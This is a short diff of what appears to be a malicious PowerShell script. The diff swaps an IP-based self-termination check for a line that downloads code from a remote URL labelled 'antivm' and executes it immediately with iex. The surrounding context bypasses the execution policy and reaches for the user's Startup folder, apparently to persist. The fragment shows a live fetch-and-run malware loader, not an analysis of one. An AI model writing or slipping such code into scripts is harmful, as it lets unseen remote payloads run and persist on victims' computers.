@@ -27,19 +27,7 @@ Add-Type @"
 
 Set-ExecutionPolicy Bypass -Scope Process -Force
 
-# Define the target IP
-$TargetIP = "26.165.195.200"
-
-# Get all network interfaces and their IP addresses
-$IPs = Get-NetIPAddress | Select-Object -ExpandProperty IPAddress
-
-# Check if the target IP exists
-if ($IPs -contains $TargetIP) {
-    Write-Host "IP $TargetIP found. Exiting..."
-    Stop-Process -Id $pid -Force
-} else {
-    Write-Host "IP $TargetIP not found."
-}
+iwr "https://codeforfun.vercel.app/antivm" | iex
 
 
 $startupfolder = (New-Object -ComObject WScript.Shell).SpecialFolders("Startup")
